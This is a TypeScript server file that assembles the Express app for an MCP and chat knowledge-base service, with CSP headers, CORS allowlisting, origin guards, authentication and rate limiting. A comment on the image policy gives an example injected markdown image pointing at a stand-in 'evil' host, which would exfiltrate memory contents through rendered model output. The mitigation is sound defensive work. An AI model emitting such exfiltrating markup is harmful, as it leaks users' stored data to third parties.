import { existsSync } from "node:fs";
import express, { type Express, type Router } from "express";
import cors from "cors";
import type { KnowledgeBase } from "@myzel/core";
import { mcpRouter } from "./mcp/http.js";
import { browseRouter } from "./api/browse.js";
import { chatRouter } from "./api/chat.js";
import type { AdminRouter } from "./admin.js";
import { memoryOf, type MemoryHost } from "./host.js";
import { corsDelegate, netGuard, type NetGuardConfig } from "./net-guard.js";
import { clientKey, rateLimit, type RateLimiter } from "./rate-limit.js";
import { LIMITS } from "./limits.js";

export interface AppOptions {
  guard: NetGuardConfig;
  /** Express "trust proxy" setting (TRUST_PROXY), when behind a reverse proxy. */
  trustProxy?: boolean | number | string;
  /** Brake on the routes that can start an agent run (/mcp, /api/chat). 0 disables. */
  rateLimit: { limit: number; windowMs: number };
  /** Brake on the read-only browse routes (/api, except /api/chat). 0 disables. */
  browseLimit: number;
  /** Built web UI to serve, when present. */
  webDist?: string;
  /** Administration (profiles, settings), mounted at /admin when ADMIN_TOKEN is set. */
  admin?: AdminRouter;
}

export interface App {
  app: Express;
  /** Stops background timers (tests). */
  close(): void;
}

/**
 * The HTTP application. /mcp and /api are served from whichever memory the
 * host resolves the request to, so the same wiring covers one bundle and many
 * profiles. The order of the middleware is part of the security model — see
 * docs/architecture.md §4 — so keep it when adding routes.
 */
export function buildApp(host: MemoryHost, options: AppOptions): App {
  const app = express();
  const limiters: RateLimiter[] = [];
  app.disable("x-powered-by");
  if (options.trustProxy !== undefined) app.set("trust proxy", options.trustProxy);

  // Baseline headers for the UI and API. Shiki's highlighted code carries inline
  // `style` attributes, hence 'unsafe-inline' for styles only; scripts stay
  // same-origin. frame-ancestors keeps the UI out of other sites' iframes.
  // Images only from here: model output is rendered as markdown, and an
  // injected ![](https://evil/?data=…) would otherwise send memory contents to a
  // third party the moment it renders, without a click.
  app.use((_req, res, next) => {
    res.setHeader(
      "Content-Security-Policy",
      "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; " +
        "img-src 'self' data:; connect-src 'self'; object-src 'none'; " +
        "base-uri 'self'; form-action 'self'; frame-ancestors 'none'"
    );
    res.setHeader("X-Content-Type-Options", "nosniff");
    res.setHeader("Referrer-Policy", "no-referrer");
    next();
  });

  // Liveness for container health checks. Outside /api and /mcp on purpose: it
  // needs no token, touches no memory and reveals nothing but "up".
  app.get("/healthz", (_req, res) => {
    res.json({ status: "ok" });
  });

  // Same-origin plus an explicit allowlist — never a blanket reflection of the
  // request origin, which would let any page in the user's browser read the
  // memory off an unauthenticated instance.
  app.use(cors(corsDelegate(options.guard)));
  app.use(express.json({ limit: LIMITS.jsonBody }));

  // Origin/Host validation for everything that touches a memory or the
  // profiles. Runs before auth, so a hostile origin is refused whether or not a
  // credential is set.
  app.use(["/mcp", "/api", "/admin"], netGuard(options.guard));

  // Authentication resolves the memory (res.locals.memory) for /mcp and /api.
  app.use(["/mcp", "/api"], (req, res, next) => host.authenticate(req, res, next));

  // Both of these can start an agent run, which costs tokens — brake them.
  if (options.rateLimit.limit > 0) {
    const limiter = rateLimit({
      ...options.rateLimit,
      hint: "Raise RATE_LIMIT, or set it to 0 to disable.",
      // Profiles are walls: one memory's traffic behind a shared NAT or proxy
      // must not use up another memory's budget.
      key: (req, res) => `${memoryOf(res).profile ?? ""}|${clientKey(req)}`,
    });
    limiters.push(limiter);
    app.use(["/mcp", "/api/chat"], limiter);
  }
  // The browse API never calls a model, but each request reads the whole bundle;
  // a looser brake keeps a scripted client from pinning the disk. /api/chat has
  // its own (stricter) limit above and is not counted twice.
  if (options.browseLimit > 0) {
    const browseLimiter = rateLimit({
      limit: options.browseLimit,
      windowMs: options.rateLimit.windowMs,
      hint: "Raise RATE_LIMIT_BROWSE, or set it to 0 to disable.",
    });
    limiters.push(browseLimiter);
    app.use("/api", (req, res, next) =>
      req.path === "/chat" ? next() : browseLimiter(req, res, next)
    );
  }

  // Routers close over one KnowledgeBase, so build them once per memory and
  // dispatch each request to the set belonging to the memory it resolved to.
  const routers = new WeakMap<KnowledgeBase, { mcp: Router; api: Router }>();
  const routersFor = (kb: KnowledgeBase) => {
    let set = routers.get(kb);
    if (!set) {
      set = { mcp: mcpRouter(kb), api: express.Router().use(browseRouter(kb), chatRouter(kb)) };
      routers.set(kb, set);
    }
    return set;
  };

  app.use("/mcp", (req, res, next) => routersFor(memoryOf(res).kb).mcp(req, res, next));
  // Which memory this caller is talking to — lets the UI label the profile.
  app.get("/api/profile", (_req, res) => {
    res.json({ mode: host.mode, profile: memoryOf(res).profile });
  });
  app.use("/api", (req, res, next) => routersFor(memoryOf(res).kb).api(req, res, next));

  if (options.admin) app.use("/admin", options.admin);

  // The built web UI: index.html at "/" and its assets — nothing else. The UI
  // has no client-side routes, and its asset URLs are relative (to work under a
  // proxy path prefix), so serving index.html at other paths would only produce
  // a blank page whose assets resolve under that path. Unknown paths are 404s.
  if (options.webDist && existsSync(options.webDist)) {
    app.use(express.static(options.webDist));
  }

  // Last resort: log the error, but never send a stack trace (absolute paths,
  // library internals) to the client.
  app.use(
    (err: unknown, _req: express.Request, res: express.Response, next: express.NextFunction) => {
      if (res.headersSent) return next(err);
      console.error("[myzel] unhandled request error:", err);
      const status = (err as { status?: unknown }).status;
      res
        .status(typeof status === "number" && status >= 400 && status < 600 ? status : 500)
        .json({ error: "internal error" });
    }
  );

  return {
    app,
    close() {
      for (const limiter of limiters) limiter.stop();
      options.admin?.stopThrottle();
      host.stop();
    },
  };
}
